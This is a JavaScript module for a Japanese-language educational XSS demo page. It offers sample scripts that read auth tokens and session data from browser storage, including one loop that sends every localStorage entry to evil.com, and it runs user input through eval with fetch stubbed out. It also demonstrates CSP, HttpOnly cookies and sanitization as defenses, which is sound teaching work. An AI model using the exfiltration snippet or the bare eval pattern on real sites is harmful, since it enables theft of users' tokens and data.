export class XSSDemo {
  constructor() {
    this.xssInput = document.getElementById("xssInput");
    this.xssResult = document.getElementById("xssResult");
    this.attackCategories = {
      basic: {
        name: "🎯 基本的な攻撃",
        description: "単純なlocalStorageアクセス攻撃",
        scripts: [
          {
            code: 'localStorage.getItem("token")',
            name: "トークン窃取",
            explanation: "認証トークンを直接取得"
          },
          {
            code: 'sessionStorage.getItem("user_data")',
            name: "セッションデータ窃取", 
            explanation: "セッションストレージからユーザー情報を取得"
          }
        ]
      },
      advanced: {
        name: "🔥 高度な攻撃",
        description: "全データ窃取や持続的攻撃",
        scripts: [
          {
            code: 'Object.keys(localStorage).map(k => `${k}: ${localStorage.getItem(k)}`).join("\\n")',
            name: "全データ列挙",
            explanation: "localStorage内の全データを一覧表示"
          },
          {
            code: 'JSON.stringify(localStorage)',
            name: "JSON形式で全取得",
            explanation: "全データをJSON形式で構造化して取得"
          }
        ]
      },
      persistent: {
        name: "💀 持続的攻撃",
        description: "マルウェア埋め込みや継続的な攻撃",
        scripts: [
          {
            code: 'localStorage.setItem("malware", "<script>alert(\\"Persistent XSS!\\")</script>")',
            name: "マルウェア埋め込み",
            explanation: "悪意のあるコードをlocalStorageに保存"
          },
          {
            code: 'for(let i=0; i<localStorage.length; i++) { const key = localStorage.key(i); fetch(`https://evil.com/steal?${key}=${localStorage.getItem(key)}`); }',
            name: "外部送信攻撃",
            explanation: "全データを攻撃者のサーバーへ送信"
          }
        ]
      }
    };
  }

  init() {
    window.runXSS = () => this.runXSS();
    this.addExampleButtons();
    this.addWarning();
    this.addDefenseDemo();
  }

  addWarning() {
    const warningElement = document.createElement("div");
    warningElement.className = "xss-warning";
    warningElement.innerHTML = `
      <strong>⚠️ 警告:</strong> このデモは教育目的のみです。
      実際のWebサイトで同様のコードを実行しないでください。
    `;
    
    const xssSection = document.getElementById("xss");
    const firstChild = xssSection.querySelector("p");
    if (firstChild) {
      firstChild.after(warningElement);
    }
  }

  addExampleButtons() {
    const exampleContainer = document.createElement("div");
    exampleContainer.className = "xss-examples";
    exampleContainer.innerHTML = "<h3>🎯 攻撃シナリオ選択</h3>";
    
    Object.entries(this.attackCategories).forEach(([categoryId, category]) => {
      const categorySection = document.createElement("div");
      categorySection.className = "attack-category";
      
      const categoryHeader = document.createElement("div");
      categoryHeader.className = "category-header";
      categoryHeader.innerHTML = `
        <h4>${category.name}</h4>
        <p class="category-description">${category.description}</p>
      `;
      categorySection.appendChild(categoryHeader);
      
      const scriptsContainer = document.createElement("div");
      scriptsContainer.className = "attack-scripts";
      
      category.scripts.forEach((script, index) => {
        const scriptCard = document.createElement("div");
        scriptCard.className = "attack-script-card";
        scriptCard.innerHTML = `
          <div class="script-info">
            <strong>${script.name}</strong>
            <span class="script-explanation">${script.explanation}</span>
          </div>
          <button class="select-script-btn" data-code="${script.code.replace(/"/g, '&quot;')}">
            選択
          </button>
        `;
        
        scriptCard.querySelector('.select-script-btn').onclick = () => {
          this.xssInput.value = script.code;
          this.showScriptExplanation(script);
        };
        
        scriptsContainer.appendChild(scriptCard);
      });
      
      categorySection.appendChild(scriptsContainer);
      exampleContainer.appendChild(categorySection);
    });
    
    this.xssInput.parentNode.insertBefore(exampleContainer, this.xssInput);
  }

  showScriptExplanation(script) {
    let explanationDiv = document.querySelector('.script-explanation-active');
    if (explanationDiv) {
      explanationDiv.remove();
    }
    
    explanationDiv = document.createElement('div');
    explanationDiv.className = 'script-explanation-active';
    explanationDiv.innerHTML = `
      <div class="explanation-content">
        <h4>📝 選択された攻撃: ${script.name}</h4>
        <p><strong>動作:</strong> ${script.explanation}</p>
        <p><strong>コード:</strong></p>
        <code>${script.code}</code>
        <div class="risk-indicator">
          <span class="risk-level">🔴 高リスク</span>
          <span>実際の攻撃では個人情報やアカウントが盗まれる可能性があります</span>
        </div>
      </div>
    `;
    
    this.xssInput.parentNode.insertBefore(explanationDiv, this.xssInput.nextSibling);
  }

  runXSS() {
    const input = this.xssInput.value.trim();
    
    if (!input) {
      this.showResult("スクリプトを入力してください", "info");
      return;
    }

    this.clearResult();
    this.showExecutionSteps(input);
    
    try {
      console.log("XSSデモ実行:", input);
      
      const originalAlert = window.alert;
      const originalFetch = window.fetch;
      let alertContent = null;
      let fetchAttempts = [];
      
      window.alert = (msg) => {
        alertContent = msg;
        this.logSecurityEvent("ALERT_CALLED", { message: msg });
      };
      
      window.fetch = (url, options) => {
        fetchAttempts.push({ url, options });
        this.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { url, options });
        return Promise.reject(new Error("セキュリティ: 外部送信をブロックしました"));
      };
      
      const beforeStorage = this.captureStorageSnapshot();
      const result = eval(input);
      const afterStorage = this.captureStorageSnapshot();
      
      window.alert = originalAlert;
      window.fetch = originalFetch;
      
      this.analyzeSecurityImpact(beforeStorage, afterStorage, fetchAttempts);
      
      if (alertContent !== null) {
        this.showResult(`alert内容: ${alertContent}`, "alert");
      } else if (result !== undefined) {
        this.showResult(`実行結果: ${this.formatResult(result)}`, "success");
      } else {
        this.showResult("実行完了（結果なし）", "info");
      }
      
    } catch (e) {
      this.showResult(`エラー: ${e.message}`, "error");
    }
  }

  showExecutionSteps(script) {
    const stepsDiv = document.createElement('div');
    stepsDiv.className = 'execution-steps';
    stepsDiv.innerHTML = `
      <h4>🔍 実行ステップ</h4>
      <ol class="steps-list">
        <li class="step-item">✅ 入力スクリプトの検証完了</li>
        <li class="step-item">🔐 セキュリティ環境の準備完了</li>
        <li class="step-item">📊 ストレージ状態の記録開始</li>
        <li class="step-item active">⚡ スクリプト実行中...</li>
      </ol>
    `;
    
    this.xssResult.parentNode.insertBefore(stepsDiv, this.xssResult);
    
    setTimeout(() => {
      const lastStep = stepsDiv.querySelector('.step-item.active');
      if (lastStep) {
        lastStep.textContent = '✅ スクリプト実行完了';
        lastStep.classList.remove('active');
      }
    }, 500);
  }

  captureStorageSnapshot() {
    const snapshot = {
      localStorage: {},
      sessionStorage: {},
      count: {
        local: localStorage.length,
        session: sessionStorage.length
      }
    };
    
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      snapshot.localStorage[key] = localStorage.getItem(key);
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      snapshot.sessionStorage[key] = sessionStorage.getItem(key);
    }
    
    return snapshot;
  }

  analyzeSecurityImpact(before, after, fetchAttempts) {
    const changes = {
      localStorage: this.compareStorageObjects(before.localStorage, after.localStorage),
      sessionStorage: this.compareStorageObjects(before.sessionStorage, after.sessionStorage),
      externalRequests: fetchAttempts.length
    };
    
    this.displaySecurityAnalysis(changes);
  }

  compareStorageObjects(before, after) {
    const changes = { added: [], modified: [], removed: [] };
    
    Object.keys(after).forEach(key => {
      if (!before[key]) {
        changes.added.push(key);
      } else if (before[key] !== after[key]) {
        changes.modified.push(key);
      }
    });
    
    Object.keys(before).forEach(key => {
      if (!after[key]) {
        changes.removed.push(key);
      }
    });
    
    return changes;
  }

  displaySecurityAnalysis(changes) {
    const hasChanges = changes.localStorage.added.length || 
                      changes.localStorage.modified.length || 
                      changes.localStorage.removed.length ||
                      changes.sessionStorage.added.length || 
                      changes.sessionStorage.modified.length || 
                      changes.sessionStorage.removed.length ||
                      changes.externalRequests > 0;
    
    if (hasChanges) {
      const analysisDiv = document.createElement('div');
      analysisDiv.className = 'security-analysis';
      analysisDiv.innerHTML = `
        <h4>🛡️ セキュリティ影響分析</h4>
        ${this.generateAnalysisReport(changes)}
      `;
      
      this.xssResult.parentNode.insertBefore(analysisDiv, this.xssResult);
    }
  }

  generateAnalysisReport(changes) {
    let report = '<div class="analysis-report">';
    
    if (changes.localStorage.added.length || changes.localStorage.modified.length || changes.localStorage.removed.length) {
      report += `
        <div class="storage-changes">
          <h5>📦 localStorage への影響:</h5>
          <ul>
            ${changes.localStorage.added.map(key => `<li class="change-added">➕ 追加: "${key}"`).join('')}
            ${changes.localStorage.modified.map(key => `<li class="change-modified">✏️ 変更: "${key}"`).join('')}
            ${changes.localStorage.removed.map(key => `<li class="change-removed">❌ 削除: "${key}"`).join('')}
          </ul>
        </div>
      `;
    }
    
    if (changes.sessionStorage.added.length || changes.sessionStorage.modified.length || changes.sessionStorage.removed.length) {
      report += `
        <div class="storage-changes">
          <h5>⏳ sessionStorage への影響:</h5>
          <ul>
            ${changes.sessionStorage.added.map(key => `<li class="change-added">➕ 追加: "${key}"`).join('')}
            ${changes.sessionStorage.modified.map(key => `<li class="change-modified">✏️ 変更: "${key}"`).join('')}
            ${changes.sessionStorage.removed.map(key => `<li class="change-removed">❌ 削除: "${key}"`).join('')}
          </ul>
        </div>
      `;
    }
    
    if (changes.externalRequests > 0) {
      report += `
        <div class="security-threat">
          <h5>🚨 外部通信の試行:</h5>
          <p class="threat-blocked">${changes.externalRequests}件の外部送信試行をブロックしました</p>
          <p class="threat-warning">⚠️ 実際の攻撃では、この通信により個人情報が盗まれます</p>
        </div>
      `;
    }
    
    report += '</div>';
    return report;
  }

  logSecurityEvent(type, data) {
    console.warn(`セキュリティイベント [${type}]:`, data);
  }

  formatResult(result) {
    if (result === null) return "null";
    if (result === undefined) return "undefined";
    if (typeof result === "object") {
      try {
        return JSON.stringify(result, null, 2);
      } catch {
        return String(result);
      }
    }
    return String(result);
  }

  showResult(message, type) {
    this.xssResult.className = `xss-output xss-${type}`;
    this.xssResult.textContent = message;
    this.xssResult.style.display = "block";
  }

  clearResult() {
    this.xssResult.style.display = "none";
    this.xssResult.textContent = "";
    
    const stepsDiv = document.querySelector('.execution-steps');
    if (stepsDiv) stepsDiv.remove();
    
    const analysisDiv = document.querySelector('.security-analysis');
    if (analysisDiv) analysisDiv.remove();
    
    const explanationDiv = document.querySelector('.script-explanation-active');
    if (explanationDiv) explanationDiv.remove();
    
    const defenseDiv = document.querySelector('.defense-demo');
    if (defenseDiv) defenseDiv.remove();
  }

  addDefenseDemo() {
    const defenseSection = document.createElement('div');
    defenseSection.className = 'defense-demo';
    defenseSection.innerHTML = `
      <h3>🛡️ 防御デモンストレーション</h3>
      <div class="defense-examples">
        <div class="defense-card">
          <h4>📋 CSP (Content Security Policy)</h4>
          <p>適切なCSPヘッダーでXSS攻撃を防ぐ</p>
          <button class="defense-btn" onclick="window.xssDemo.demonstrateCSP()">CSP効果を確認</button>
        </div>
        
        <div class="defense-card">
          <h4>🔐 HttpOnly Cookie</h4>
          <p>JavaScriptからアクセスできない安全なCookie</p>
          <button class="defense-btn" onclick="window.xssDemo.demonstrateHttpOnly()">HttpOnly効果を確認</button>
        </div>
        
        <div class="defense-card">
          <h4>🧹 入力サニタイゼーション</h4>
          <p>危険な文字をエスケープして攻撃を無効化</p>
          <button class="defense-btn" onclick="window.xssDemo.demonstrateSanitization()">サニタイゼーション効果を確認</button>
        </div>
      </div>
    `;
    
    const xssSection = document.getElementById('xss');
    xssSection.appendChild(defenseSection);
    
    window.xssDemo = this;
  }

  demonstrateCSP() {
    const demoDiv = document.createElement('div');
    demoDiv.className = 'defense-result';
    demoDiv.innerHTML = `
      <h4>📋 CSP防御デモ結果</h4>
      <div class="defense-comparison">
        <div class="before-defense">
          <h5>❌ CSPなし（脆弱）</h5>
          <code>// インラインスクリプトが実行される
&lt;script&gt;alert(localStorage.token)&lt;/script&gt;</code>
          <p class="vulnerability">→ 攻撃成功: トークンが盗まれる</p>
        </div>
        
        <div class="after-defense">
          <h5>✅ CSP適用後（安全）</h5>
          <code>Content-Security-Policy: script-src 'self'</code>
          <p class="protection">→ 攻撃失敗: インラインスクリプト実行がブロックされる</p>
        </div>
      </div>
      <div class="implementation-guide">
        <h5>実装方法:</h5>
        <code>&lt;meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'"&gt;</code>
      </div>
    `;
    
    this.showDefenseResult(demoDiv);
  }

  demonstrateHttpOnly() {
    const demoDiv = document.createElement('div');
    demoDiv.className = 'defense-result';
    demoDiv.innerHTML = `
      <h4>🔐 HttpOnly Cookie 防御デモ結果</h4>
      <div class="defense-comparison">
        <div class="before-defense">
          <h5>❌ 通常のCookie（脆弱）</h5>
          <code>document.cookie = "token=abc123"
console.log(document.cookie) // "token=abc123"</code>
          <p class="vulnerability">→ 攻撃成功: JSからCookieにアクセス可能</p>
        </div>
        
        <div class="after-defense">
          <h5>✅ HttpOnly Cookie（安全）</h5>
          <code>Set-Cookie: token=abc123; HttpOnly; Secure
console.log(document.cookie) // ""（空文字）</code>
          <p class="protection">→ 攻撃失敗: JSからCookieにアクセス不可</p>
        </div>
      </div>
      <div class="implementation-guide">
        <h5>実装方法（サーバーサイド）:</h5>
        <code>res.setHeader('Set-Cookie', 
  'token=abc123; HttpOnly; Secure; SameSite=Strict');</code>
      </div>
    `;
    
    this.showDefenseResult(demoDiv);
  }

  demonstrateSanitization() {
    const maliciousInput = '<script>alert("XSS")</script><img src="x" onerror="alert(\'XSS\')">';
    const sanitizedInput = this.sanitizeInput(maliciousInput);
    
    const demoDiv = document.createElement('div');
    demoDiv.className = 'defense-result';
    demoDiv.innerHTML = `
      <h4>🧹 入力サニタイゼーション防御デモ結果</h4>
      <div class="defense-comparison">
        <div class="before-defense">
          <h5>❌ サニタイゼーションなし（脆弱）</h5>
          <code>innerHTML = "${maliciousInput}"</code>
          <p class="vulnerability">→ 攻撃成功: スクリプトが実行される</p>
        </div>
        
        <div class="after-defense">
          <h5>✅ サニタイゼーション後（安全）</h5>
          <code>innerHTML = "${sanitizedInput}"</code>
          <p class="protection">→ 攻撃失敗: 危険な文字がエスケープされる</p>
        </div>
      </div>
      <div class="implementation-guide">
        <h5>実装方法:</h5>
        <code>// DOMPurifyライブラリ使用例
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;</code>
      </div>
    `;
    
    this.showDefenseResult(demoDiv);
  }

  sanitizeInput(input) {
    return input
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  }

  showDefenseResult(demoDiv) {
    const existingResult = document.querySelector('.defense-result');
    if (existingResult) {
      existingResult.remove();
    }
    
    const defenseDemo = document.querySelector('.defense-demo');
    defenseDemo.appendChild(demoDiv);
    
    demoDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }
}